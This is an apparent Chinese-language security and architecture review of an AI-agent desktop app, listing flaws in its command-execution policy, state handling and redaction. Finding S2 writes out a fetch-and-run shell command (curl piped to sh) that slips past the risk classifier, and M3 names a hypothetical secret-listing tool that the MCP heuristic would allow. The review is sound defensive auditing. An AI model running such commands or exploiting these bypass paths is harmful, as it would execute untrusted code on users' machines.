# Loom 架构与功能评审

> **现状说明（2026-10-20 补记）**：本文是简化 Chat 重构（`3dd9a9f`）之前的**历史基线**，以下正文保持原样，不代表当前代码。Task/Board/Planning 已退出产品，Workbench、新内核与 SDK worker 冻结。2026-10-20 在 `codex/simple-cli-chat` 上按文件与关键代码复核的结论：
>
> - **已过时**：S1、S2（`execution_policy.rs`、command runner、PTY 已在 `3dd9a9f` 删除）；S3（`src/state/reducers/` 已删除）；S6（已有 `src/components/common/ErrorBoundary.tsx`，`main.tsx` 与 `ChatPage.tsx` 使用）；M2（所列 Planning/Testing 组件已删除，`SettingsPage.tsx` 现约 126 行）；M6（`WorkbenchApp.tsx` 只剩清理类 `.catch`）；M11（仓库已恢复正常提交粒度）。
> - **已修复**：S4 的 Markdown 部分（2026-10-20：`transcript.md` 的消息正文与分段已套用 `redact_sensitive_text`；`session.json` 按回滚需要保持原文；脱敏规则覆盖面偏窄的问题仍在）。
> - **仍存在**：S7（`docs/security-policy.md` 仍无 Workbench 边界章节）；M4（`packages/provider-workers/src/worker.ts` 仍为 `z.literal(1)`）；M7（`diagnostics.rs` 仍只替换 `$HOME` 字面值）。
> - **未复核（冻结代码，文件仍在）**：S5、M1、M3、M5、M8；M9 所指 `core_bridge.rs` 已不存在，审批轮询逻辑需在 `src-tauri/src/workbench/runtime.rs` 重新定位。
> - M10 的测试缺口需按当前 Chat 范围（停止回收、Auto-run 确认）重新评估；旧 Task 阶段门禁不再适用。

评审日期：2026-10-19　范围：`crates/`、`src-tauri/src/`、`src/`、`packages/`、`contracts/`
方法：文档基线比对 + 三路并行代码审查 + 主评审对高危结论逐项复核
基线：工作区干净（`git status` 无改动），分支 `main`

---

## 0. 结论摘要

架构判断力是强项，工程诚实度也是强项——文档明确承认 Chat 未走完整策略、`ask` 不是逐工具审批、指纹不等于沙箱证明，没有把交互约定包装成安全保证。这在同类项目里少见。

真正的风险不在"设计错了"，而在三处：

1. **双内核并存已进入第 3 个月**，新内核默认不启用（`VITE_LOOM_WORKBENCH=1`），旧四阶段明确"不再扩张"但仍在运行。两套安全边界、两套状态模型、两套 Shell 同时演进，边界正在渗漏（见 S7）。
2. **前端有两处自行推进领域状态**，直接违反 `architecture.md:67` 写明的"UI 状态只是 Task 的投影"（见 S3）。
3. **命令风险分类的兜底是 Safe**，未识别即放行；shell wrapper 拒绝只在 adapter 层实现，未覆盖 command runner / PTY 路径（见 S2）。

功能完成度：旧四阶段 Task 按 `requirements-audit.md`（2026-07-24 基线）33 项需求域全部"完成"且有代码与自动测试证据；Craft 重建按 `docs/plans/2026-09-30/13:17-craft-parity-rebuild.md` 第 24 节，M0/M1 未收口、M2 实施中未到出口、M3–M8 未开始，**F01–F23 无任何一项为 `passed`**。两份状态不矛盾，是两个不同产品形态。

---

## 1. 架构现状

### 1.1 双内核

| | 旧实现 | 新内核 |
|---|---|---|
| 位置 | `src-tauri/src/`（约 3.1 万行） | `crates/loom-core` + `crates/loom-runtime`（约 1.7 万行） |
| 领域模型 | Task 四阶段：Planning→Implement→Review→Testing | Workspace / Session / Turn / ToolCall |
| 前端 | `ChatShell`（当前交付优先）+ `WorkflowShell`（高级 Task） | `src/workbench/`，环境变量开关 |
| 默认启用 | 是 | 否 |
| 状态 | 稳定，明确不再扩张 | M2 实施中 |

`loom-core` 分层干净：Cargo 依赖仅 serde / sha2 / url / libc，无 Tauri、无 IO、无平台细节，领域模型与审批状态机自包含。`loom-runtime` 通过 `ToolPolicy` trait 注入策略，不反向污染 core。这部分做得对。

### 1.2 契约层

`contracts/tauri-contract.json`（398 行）作为 Rust 与 TS 共享的 canonical contract，双向校验：Rust 侧 `src-tauri/src/contracts.rs` 校验 Tauri 注册表、事件名、枚举、schema version、持久化 wire sample；前端侧 `tests/unit/contract.test.cjs` 校验同一 fixture，并自动扫描"桥接层之外直接调用 `@tauri-apps/api/core|event`"的违规。

复核结果：全前端仅 `src/api/tauriClient.ts` 一个文件、2 处 import，隔离是真实的，不是文档宣称。

---

## 2. 严重问题

### S1　Chat 路径完全不引用 execution_policy

复核命令：`grep -rn "execution_policy|authorize_execution|evaluate_execution" src-tauri/src/chat/ src-tauri/src/chat_context.rs` → **零命中**。

调用链 `chat/mod.rs:889` → `chat_context.rs:41` → `chat/runtime.rs:592`，全程未经 canonicalize、未做路径逃逸检查、未做危险分类。

`security-policy.md:31-33` 已承认此边界，所以这不是"文档撒谎"。问题在**代码里没有任何注释或命名区分"有意跳过"与"遗漏"**。后续维护者读到 `authorize_execution` 在 command_runner / pty / stream / review 四处都有调用，很自然会假设 Chat 也有。

影响面：安全误导（高）+ 维护风险（高）。
建议：`chat_send` 入口至少补 cwd 的 canonicalize + `starts_with(project_path)` 检查；同时在调用点写明"Chat 当前不走 execution_policy，这是已知限制而非安全保障"。

### S2　风险分类兜底为 Safe，shell wrapper 拒绝未覆盖执行路径

`execution_policy.rs:377-382`：所有模式都未命中时返回 `ExecutionRiskLevel::Safe` + `"command stays inside the project and has no recognized high-risk pattern"`。默认放行。

`security-policy.md:60` 声称"自定义 CLI adapter 不接受 shell wrapper"——这条**确实实现了**，在 `agent_adapter.rs:336-339`（拒绝 `sh|bash|zsh|fish|cmd|powershell|pwsh`，并有测试 `custom_adapter_rejects_shell_wrappers`）。

但它只约束**自定义 Agent 的可执行命令配置**，不约束 command runner / PTY 执行的命令。因此 `sh -c "curl https://x | sh"` 经 `classify_command` 后：executable 是 `sh`（不在任何 High 名单），joined 串不命中 `rm -` / `git reset` / prod 关键词 / 包管理器变更 → **判为 Safe 直接放行**。

影响面：安全绕过（中—高，取决于用户是否让 Agent 跑任意命令；`production_external` 类别可被完整绕过）。
建议：`evaluate_execution` 开头对 shell + `-c` 组合显式判 High 或 Denied，与 adapter 层策略对齐；并把兜底从 Safe 改为 Unknown（走用户确认设置）。

### S3　前端 reducer 自行推进领域状态

违反 `architecture.md:67`「UI 状态只是 Task 的投影。所有阶段推进和验收门禁均在 Rust 再校验」。已复核确认：

- `src/state/reducers/tasks.ts:165`：`todoCompleted` 在所有 todo done 时把 `task.status` 直接写为 `"reviewing"`
- `src/state/reducers/commandTrace.ts:24,28`：`applyCommandFinishStatus` / `applyCommandStartStatus` 按命令退出码推导 `"verifying"` / `"debugging"`

Rust 侧门禁本身是扎实的（`lifecycle.rs:246-278`、`implementation_review.rs:602-644` 校验 reviewer ≠ primary、unresolved blocker 阻止进入 Testing、最新 validation 必须成功才允许 complete），所以**不会造成越权推进**。真实后果是 UI 乐观展示与后端真相不一致：Rust 拒绝或延迟时，用户已经看到下一阶段并基于错误前提操作。

影响面：状态不一致（中）。修复成本低。
建议：reducer 改为纯展示映射（派生 `displayedStage`），不写 `task.status`；状态变更统一由 Rust 事件驱动。

### S4　Chat 导出未应用脱敏

`chat/export.rs:87-91` 直接输出 `message.content` 与 `serde_json::to_string_pretty(&message.parts)` 原文，未调用 `redact_sensitive_text`。

`security-policy.md:43` 承认"用户输入和转录不是全面的凭据隔离边界"，但导出路径连**已有的**脱敏都没用上，这属于实现缺口而非声明边界。另外 `redact_sensitive_text` 覆盖的 key 列表偏窄（api_key / token / secret / password / passwd + Bearer），不含 `Authorization: Basic`、`x-api-key`、`export VAR=`、PEM 私钥块、数据库连接串。

影响面：数据泄露（中，需用户主动把凭据粘进对话才会触发）。
建议：导出出口统一调用脱敏；扩展正则覆盖 Authorization header 全格式与环境变量赋值。

### S5　新内核 `paths::within` 的检查非原子

`crates/loom-runtime/src/policy/paths.rs:79-87`：先 `target.starts_with(base)` 做字面前缀判断，再对两者分别 `nearest_real` canonicalize 后比较。`allowlisted`（`:88-110`）同样对 lexical 和 real 各匹配一次。

两步之间没有原子性保证。理论上存在 symlink 替换的 TOCTOU 窗口。需要说明的是：**利用前提是攻击者能在 Guarded 模式下于项目内创建/替换符号链接**，即已经具备本地写权限，因此实际可利用性低于典型 TOCTOU。但 `within` 是写路径检查的唯一守门函数，值得改成 canonicalize-first 或 open-time 验证（`openat2 RESOLVE_BENEATH` / 逐段 fstat）。

影响面：安全绕过（低—中，需本地写权限前提）。

### S6　无 Error Boundary

复核：`grep -rn "ErrorBoundary|componentDidCatch" src` → **0 命中**。

任何组件 render 异常直接白屏。Agent CLI 返回意外结构、`workbenchClient.ts:34` 的 `raw as CoreReply` 断言失配、`projection.ts` 中 14 处 `as` 产生的 undefined 字段访问——都会走到这条路径，且没有降级 UI。

影响面：用户体验（高）+ 可用性。修复成本约 10 行。

### S7　workbench 工具执行不经过 execution_policy

`src-tauri/src/workbench/mod.rs:25-29` 仅校验 window label == `"main"`；其 runtime 中的工具执行（write / read 等）走 loom_core 协议与 `ToolPolicy`，不经过 `execution_policy`。

这是新内核的有意设计（新内核有自己的策略层，且更严：审批绑定六元组 digest、consume 时重校验、remembered grant 绑 context_digest 且 runtime 结束自动撤销）。但**两份安全策略文档都未提及这条并行边界**，而新旧内核当前运行在同一进程内。

影响面：文档缺口 + 迁移期风险。
建议：在 `security-policy.md` 增补 workbench 边界一节，明确"新内核策略与 Task 策略是两套独立实现，各自的保证不互相覆盖"。

---

## 3. 中等问题

| # | 位置 | 问题 |
|---|---|---|
| M1 | `src/workbench/WorkbenchApp.tsx` | 上帝组件：约 20 个 useState/useRef + CRUD + 发送 + 权限切换 + 连接选择 + 快捷键 + dialog + workspace 切换。新内核是当前主线，越晚拆成本越高 |
| M2 | 5 个超长组件 | `SettingsPage.tsx` 999 行、`TestingPane.tsx` 885、`PlanningTimeline.tsx` 845、`SessionPane.tsx` 789、`PlanningChat.tsx` 552 |
| M3 | `crates/loom-runtime/src/policy/mcp.rs:20-42` | `read_only` 启发式过宽：动词白名单不校验 source 命名空间，多词 action 的 fallback 跳过 source 检查。`mcp__evil__list_secrets` 会被判 ReadOnly |
| M4 | `packages/provider-workers/src/worker.ts:9,13,17` | `protocolVersion` 硬编码 `z.literal(1)`，而 `protocol.rs:5` 为 `VERSION: u32 = 2`（`runtime-worker.ts:16` 引用共享常量，是对的）。旧 worker 若被误用会在 supervisor 立即报 protocol_scope 错。建议升级或明确标记 deprecated 并移出构建 |
| M5 | `crates/loom-core` repository（session cache） | 32 上限的淘汰只驱逐非 active session，全部 slot 被 active lease 占满时新 session 无法加载，返回 StorageUnavailable，无 backpressure |
| M6 | `src/workbench/WorkbenchApp.tsx:146,148,150` | `.catch(() => {})` 吞掉标记/归档/权限切换的**业务**错误，用户无感知。同文件 L31/92/95 的 cleanup catch 是合理的，两类需区分 |
| M7 | `src-tauri/src/diagnostics.rs:127-134` | HOME 替换只处理 `$HOME` 字面值，不覆盖 `/var/folders/...` 临时目录；项目路径替换是精确匹配，symlink 别名不会被替换。诊断包可能泄露真实用户名 |
| M8 | `crates/loom-core` repository（TurnLease Drop） | Drop 中 `finish_turn` 失败仅写 diagnostic；Mutex poisoned 时连 diagnostic 都写不进，active entry 未持久化 TurnFinished，下次打开 journal 靠 interrupted 修复兜底，中间窗口状态不一致 |
| M9 | `src-tauri/src/workbench/core_bridge.rs:311-363` | 轮询 pending approval 无超时；approval TTL（240s）只在 core 侧过期检查，bridge 不主动检测，UI 不刷新则 pending map 涨到 32 上限后新工具请求被拒 |
| M10 | 前端测试缺口 | 49 个测试文件全断言式、零 snapshot（质量高），但权限授权、`stopCommandRun` / `chatAbort` 停止后的 UI 回收、阶段门禁阻止/放行均无独立端到端测试 |
| M11 | Git 历史 | 仓库仅 2 个 commit（`23a2182 Initial commit`、`bed095c`）。全部演进史被压平，无法 blame 归因——与项目自身强调的「Git baseline 归因」能力形成对照，也让本报告的"何时引入"类判断无从下手 |

### 已复核并**推翻**的子结论

评审过程中两条初判经复核不成立，一并记录以免后续误引：

- ❌「`execution_policy.rs` 未实现 shell wrapper 拒绝」→ 实际在 `agent_adapter.rs:336-339` 已实现并有测试，只是覆盖面不含 command runner / PTY（已改写为 S2）。
- ❌「生产代码大量 `unwrap()`：chat/repository.rs 191 处、workbench/runtime.rs 62 处、workbench/host.rs 54 处」→ 这些数字是**含 `#[cfg(test)]` 的全文统计**。切掉测试模块后：`chat/repository.rs` 0 处、`workbench/runtime.rs` 1 处、`workbench/host.rs` 0 处。生产代码的 `unwrap` 纪律实际非常好，不构成问题。

---

## 4. 值得保留的做法

这些不是"没有 bug"，是设计判断正确，重建时应带过去：

1. **状态机纯函数化**：`task_state.rs:22-107` 的 `transition()` 无副作用 + 完整测试，非法转换直接 Err。
2. **门禁真的在 Rust 再校验**，不是只在 UI 禁用——`architecture.md` 的承诺兑现了。
3. **审批凭证绑定六元组 digest**（session / turn / request / tool_call / arguments_digest / binding），consume 时重新校验防参数篡改（`approval.rs:187-205`、`approvals.rs:290-306`）。
4. **事件溯源三重保护**：append-only + checksum chain + commit watermark，不完整尾记录自动备份并截断，重启时 Running turn 自动标 Interrupted（`journal.rs:232-251,299-316,365-394`、`repository.rs:474-486`）。
5. **Shell 策略基于 AST 而非正则**：tree-sitter 解析，拒绝展开/替换/环境变量赋值，带时间与深度预算（`shell.rs:81-86,240-248,280-325`）。
6. **进程组生命周期**：RAII `OperationGuard` / `ProcessGuard` + `setpgid` + TERM→KILL 升级，测试覆盖 descendant 持管道、关闭管道、忽略 TERM。
7. **重启对账保守**：`run_recovery.rs:28-137` 只标 orphaned running → interrupted，不盲杀、不重跑、不推断成功。
8. **前端类型纪律**：`any` 0 处，非空断言约 3 处，生产 Rust 代码 `unwrap` 近乎 0。
9. **脱敏多层防御**：supervisor 层 KMP 流式过滤防跨帧泄露（`supervisor.rs:341-426`），approval preview 隐藏敏感字段与内容体，TS worker 端独立 clean。
10. **原子写统一**：`storage.rs:213-245` 与 `migrations.rs:55-66` 复用同一 tmp+rename 机制。

---

## 5. 建议的执行顺序

### 只做 3 件事

1. **S2 + S1 合并加固**：`evaluate_execution` 拒绝 shell + `-c` 组合、兜底从 Safe 改为 Unknown；`chat_send` 补 cwd canonicalize 与逃逸检查，并在代码里写明"这是已知限制"。这两条一起消除最实质的安全缺口，且都是小改动。
2. **S3 移除 reducer 阶段自动推进**：改为派生展示字段。修复成本低，消除状态不一致的根源，也是新内核迁移前必须清掉的旧债。
3. **S6 加 ErrorBoundary**：全局 + ChatTranscript / TerminalCard 局部子树。约 10 行换掉白屏。

### 中期（重建收口前）

- **补 `security-policy.md` 的 workbench 章节**（S7），把两套策略的边界写清楚。这是纯文档工作，但决定了迁移期是否会出现"以为受保护"的误判。
- **拆 `WorkbenchApp.tsx`**（M1）为 SessionList / ChatPanel / Composer / InfoSidebar。新内核是主线，现在拆比 M3 界面移植后拆便宜得多。
- **M4 协议版本统一**、**M3 MCP read_only 收紧 source 校验**——两处都是小改动，但分别对应"运行时直接报错"和"策略误判"。
- **补 M10 的三类端到端测试**（权限授权 / 停止回收 / 阶段门禁），这三条正好是"UI 约定 vs 后端保证"最容易混淆的地方。

### 需要产品决策，不建议技术侧自行推进

- **双内核并存的收口条件**：M0/M1 未收口、M2 未到出口、F01–F23 无 passed，而旧四阶段已稳定且"不再扩张"。需要明确"什么条件下停止维护旧实现"，否则 S7 这类边界渗漏会持续增加。
- **Git 历史压平**（M11）是否有意为之。若否，后续工作建议恢复正常提交粒度，否则任何回归归因都只能靠 `docs/dogfood/` 的人工记录。

---

## 附：本次评审的覆盖边界

已覆盖：`crates/loom-core`、`crates/loom-runtime`、`packages/provider-workers`、`packages/protocol`、`src-tauri/src/`（含 chat、tasks、workbench、执行与持久化层）、`src/`（122 文件）、`contracts/`、核心文档 8 篇。

未覆盖 / 未验证：

- **未运行任何测试或构建**，本报告所有结论基于静态阅读；`docs/PLANS.md` 记录的"117 项 core 测试通过""21 项宿主测试通过"等数字未复跑验证。
- 未做真实 CLI / 真实模型账户的运行时验收，`docs/plans/2026-09-30/13:17-craft-parity-rebuild.md` 第 24 节列出的 blocked 项（Pi SDK 原生停止/再发、真实 Guarded、Windows 进程树、发行包 Bun/worker）状态未变。
- `designs/`、`experiments/`、`third-party/`、`scripts/` 未审。
- 视觉/响应式/可访问性未做实际渲染验证，`requirements-audit.md` 声称的 26 屏 visual smoke 未复跑。
